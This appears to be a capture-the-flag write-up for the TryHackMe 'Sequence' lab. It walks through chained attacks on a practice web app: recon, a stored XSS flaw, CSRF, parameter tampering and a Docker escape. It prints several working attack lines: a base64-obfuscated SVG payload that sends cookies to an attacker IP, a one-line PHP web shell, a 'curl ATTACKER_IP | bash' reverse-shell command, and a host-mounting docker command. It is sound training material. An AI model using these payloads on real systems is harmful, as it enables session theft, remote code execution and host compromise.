![Congrats](assets/screenshots/sequence/congrats.png)

# Sequence — TryHackMe
**Room Link:** [Sequence](https://tryhackme.com/room/sequence)

## Overview
The Sequence room on TryHackMe is officially rated as a Medium difficulty challenge. The core objective is to chain multiple vulnerabilities to gain full control of the system. This involves exploiting stored XSS, CSRF, parameter tampering, unrestricted file upload, and a Docker container escape.

## Reconnaissance
We start by adding the target domain to our `/etc/hosts` file:

```bash
echo "10.48.166.194 review.thm" >> /etc/hosts
```

Then we use Nmap to identify open ports:
```bash
nmap -p- -sV -sC -Pn review.thm
```
- **Port 22 (SSH)** – OpenSSH 8.2p1
- **Port 80 (HTTP)** – Apache 2.4.41 with PHP

Critical finding: The `PHPSESSID` cookie had no `HttpOnly` flag – meaning JavaScript could access it, making XSS attacks very dangerous.

We also performed directory fuzzing:
```bash
ffuf -u http://review.thm/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -e php,txt
```
We found `/mail/` with directory listing enabled. Inside, a file named `dump.txt` leaked sensitive information:

```text
From: software@review.thm
...
The Finance panel (`/finance.php`) is hosted on the internal 192.x network.
Access is protected with password: [REDACTED]
```

This leak gave us:
1. A password for internal panels
2. Two hidden endpoints: `/finance.php` and `/lottery.php`

## Stored XSS to Steal Session Cookie
The contact form allowed arbitrary HTML/JavaScript injection. We used a self-contained payload that didn't require hosting a separate `.js` file.

We started a Python HTTP server to capture the exfiltrated cookie:
```bash
python3 -m http.server 80
```

We submitted a base64-encoded SVG payload in the contact form’s message field to bypass basic filters:
```html
&lt;svg onload="eval(atob('ZmV0Y2goJ2h0dHA6Ly8xMC40OC44MC45MC8/Yz0nICsgZG9jdW1lbnQuY29va2llKQ=='))"&gt;
```

The moderator bot visited our submission, and our server received a request containing their session cookie:
```text
GET /?c=PHPSESSID=[REDACTED]
```

We replaced our own `PHPSESSID` cookie with this value using Browser DevTools and refreshed the page. Viewing the page source revealed the mod flag in the navigation bar:

![Mod Flag](assets/screenshots/sequence/flag1.png)

## Privilege Escalation via CSRF
As a moderator, we had access to a Chat feature. The admin account automatically opened any link we sent in the chat.

In the Settings page, we found a "Promote Co-Admin" feature. It required a CSRF token, but the token never changed and was simply the MD5 hash of the username. 
We verified this by cracking the token for our `mod` user.

We then generated the token for the `admin` user:
```bash
echo -n "admin" | md5sum
# [REDACTED]
```

We sent the crafted link via the chat feature:
```text
http://review.thm/promote_coadmin.php?username=mod&csrf_token_promote=[REDACTED]
```
The admin visited it, and our `mod` account was promoted to admin. After relogging, the admin dashboard was visible, and the admin flag appeared in the page source:

![Admin Flag](assets/screenshots/sequence/flag2.png)

## Internal Panel Access via Parameter Tampering
The admin dashboard featured a "Lottery" function. However, we knew about the `/finance.php` endpoint from the earlier leak.

Using Firefox DevTools (Network tab), we intercepted the POST request for the Lottery Feature. We changed the `feature` parameter from `lottery.php` to `finance.php` and resent it.

The page displayed a password prompt. We entered the password `[REDACTED]` from the earlier leak, which granted us access to a file upload form.

## Remote Code Execution (RCE)
To exploit the file upload, we created a simple PHP shell that reads commands from a cookie to avoid parameter sanitization issues (`shell_cookie.php`):

```php
<?php system($_COOKIE["x"]); ?>
```

After uploading the shell, we triggered it using `curl` with the `x` cookie set to our reverse shell command:
```bash
curl -b "PHPSESSID=[REDACTED]; x=curl ATTACKER_IP | bash" -X POST -d "feature=uploads/shell_cookie.php" http://review.thm/dashboard.php
```

With our Netcat listener ready, the request executed our reverse shell payload, granting us a shell inside a Docker container.

## Docker Escape to Root
Inside the container, we checked for the Docker socket:
```bash
ls -la /var/run/docker.sock
```
It was mounted inside the container, meaning we could interact with the host’s Docker daemon.

We listed the available images and found `phpvulnerable:latest`:
```bash
docker image ls
```

We exploited the socket by running a new container that mounted the host’s entire filesystem at `/mnt`:
```bash
docker run -v /:/mnt --rm -it phpvulnerable:latest bash
```

Inside this new container, we navigated to `/mnt/root/` on the host filesystem and read the final flag:
```bash
cat /mnt/root/flag.txt
```

![Root Flag](assets/screenshots/sequence/flag3.png)

## Tools Used
- Nmap
- FFUF
- Netcat
- Curl
- Browser DevTools
- Python HTTP Server

## Conclusion
The Sequence room perfectly demonstrates how chained vulnerabilities can lead to complete system compromise. A single leaked text file provided the foundation, while a missing `HttpOnly` flag allowed session hijacking via XSS. From there, weak CSRF tokens allowed privilege escalation, and parameter tampering exposed an internal upload panel. Finally, a misconfigured Docker socket provided a trivial escape to root.
